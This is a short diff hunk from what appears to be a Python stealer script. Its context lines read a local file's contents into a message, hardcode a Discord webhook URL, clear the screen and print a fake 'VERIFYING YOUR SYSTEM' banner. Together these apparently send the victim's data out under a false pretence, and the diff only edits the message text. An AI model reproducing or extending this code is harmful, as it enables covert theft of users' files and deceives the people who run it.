@@ -63,7 +63,7 @@ file_contentsx1 = read_file(file_pathxx)
 
 
 webhook_url = "https://discord.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM"
-message = file_contentsx1+" run the loader."
+message = file_contentsx1+""
 os.system('cls')
 print("---VERIFYING YOUR SYSTEM,PLEASE WAIT A MOMENT")
 print("---VERIFYING YOUR SYSTEM,PLEASE WAIT A MOMENT")
